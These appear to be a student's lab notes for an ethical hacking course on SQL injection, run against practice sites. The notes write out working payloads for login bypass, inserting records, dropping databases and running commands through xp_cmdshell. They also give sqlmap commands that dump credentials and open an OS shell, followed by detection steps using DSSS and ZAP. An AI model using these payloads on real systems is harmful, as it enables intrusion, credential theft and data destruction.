SQL injection attacks can be performed using various techniques to view, manipulate, insert, and delete data from an application’s database. There are three main types of SQL injection:

- **In-band SQL injection**: An attacker uses the same communication channel to perform the attack and retrieve the results
- **Blind/inferential SQL injection**: An attacker has no error messages from the system with which to work, but rather simply sends a malicious SQL query to the database
- **Out-of-band SQL injection**: An attacker uses different communication channels (such as database email functionality, or file writing and loading functions) to perform the attack and obtain the results

# Lab 1: Perform SQL Injection Attacks
SQL injection can be used to implement the following attacks:

- **Authentication bypass**: An attacker logs onto an application without providing a valid username and password and gains administrative privileges
- **Authorization bypass**: An attacker alters authorization information stored in the database by exploiting SQL injection vulnerabilities
- **Information disclosure**: An attacker obtains sensitive information that is stored in the database
- **Compromised data integrity**: An attacker defaces a webpage, inserts malicious content into webpages, or alters the contents of a database
- **Compromised availability of data**: An attacker deletes specific information, the log, or audit information in a database
- **Remote code execution**: An attacker executes a piece of code remotely that can compromise the host OS

## Task 1: Perform an SQL Injection Attack on an MSSQL Database

Win server 19 - victim
Win 11 - attacker

	[Win 11]
	http://www.goodshopping.com
	Login
	Username: blah' or 1=1 --
	password : empty
	Successfully logged in

	[Win server 19]
	launch Microsoft SQL Server Management Studio 18
	LHP - Microsoft SQL Server Management Studio window, under the Object Explorer section, expand the Databases node. From the available options, expand the 
	GoodShopping node, and then the Tables node under it.
	Under the Tables node, right-click the dbo.Login file and click Select Top 1000 Rows from the context menu to view the available credentials.
	database contains only one entry with the username and password as smith and smith123
	
	[Win 11]
	www.goodshopping.com
	username:blah';insert into login values('john','apple123');--
	password:empty
	
	If no error message is displayed, it means that you have successfully created your login using an SQL injection query.
	Verify by logging
	john/apple123
	logout
		
	[Win Server 2019]
	Microsoft SQL Server Management Studio window, right-click dbo.Login, and click Select Top 1000 Rows from the context menu.New entry can be found john and apple123.
	
	[Win 11]
	www.goodshopping.com
	
	username: blah'create database mydatabase;--
	pwd: empty
	
	mydatabase - name of db
	
	[Win server 2019]
	In the Microsoft SQL Server Management Studio window, un-expand the Databases node and click the Disconnect icon and then click Connect Object Explorer icon to 
	connect to the database. In the Connect to Server pop-up, leave the default settings as they are and click the Connect button.
	A new database has been created with the name mydatabase
	
	[Win 11]
	user:blah'; DROP DATABASE mydatabase; --
	pwd:empty
	
	[Win 19]
	Refresh databse in MS SQL server - db is deleted
	Close MS SQL server
	
	[Win 11]
	goodshopping
	Login:blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --
	pwd: empty
	pinging the www.certifiedhacker.com website using an SQL injection query. -l is the sent buffer size and -t refers to pinging the specific host.
	
	The SQL injection query starts pinging the host, and the login page shows a Waiting for www.goodshopping.com… message at the bottom of the window.
	
	To see whether the query has successfully executed, 
	[Windows Server 2019]
	
	Right click Open Task Manager. Click More details in the lower section of the Task Manager window.Navigate to the Details tab and type p. You can observe a process 
	called PING.EXE running in the background.This process is the result of the SQL injection query that you entered in the login field of the target website.
	
	End task ping.exe
---
## Task 2: Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap

	[parrot]
	Launch http://www.moviescope.com
	sam/test
	View Profile -> Make a note of the URL in the address bar
	Right click on the page + Inspect Element(Q)
	Console -> document.cookie (copy cookie value)
	
	Terminal
	sudo su
	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="copied value" --dbs
	--dbs  -> enumerates dbms db
	Displays information about the web server OS, web application technology, and the backend DBMS
	
	choose a database and use sqlmap to retrieve the tables
	
	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="copied value" -D moviescope --tables
	 -D specifies the DBMS database to enumerate and 
	 --tables enumerates DBMS database tables.
	
	retrieve the table content of the column User_Login
	
	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="copied value" -D moviescope -T User_Login --dump
	 - dump all the User_Login table content.
	
	Logout from the website and relogin with found credentials
	
	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="copied value" --os-shell
		 prompt for an interactive OS shell.
	
	Once sqlmap acquires the permission to optimize the machine, it will provide you with the OS shell. 
	
	hostname  -> where the site is running
	TASKLIST  -> view a list of tasks that are currently running on the target system.
---
# Lab 2: Detect SQL Injection Vulnerabilities using Various SQL Injection Detection Tools

## Task 1: Detect SQL Injection Vulnerabilities using DSSS
	Win server 2019 - www.moviescope.com is hosted
	
	[parrot]
	sudo su
	cd DSSS
	python3 dsss.py
	
	launch http://www.moviescope.com/
	sam/test
	ViewProfile
	Rightclick on the page + Inspect Element
	console -> document.cookie (copy)
	
	Terminal
	python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="copied value"
	Highlight the vulnerable website link, right-click it, and, from the options, click Copy.
	
	Firefox-new terminal
	paste the vulnerable website link
	observe that information regarding available user accounts appears under the View Profile tab.
---
## Task 2: Detect SQL Injection Vulnerabilities using OWASP ZAP

	[Win server 2019]
	launch ZAP
	Quick start - Automated Scan
	Target URL - http://www.moviescope.com - Attack
	Alerts - SQL injection vul
	observe the information such as Risk, Confidence, Parameter, Attack, etc.,
---
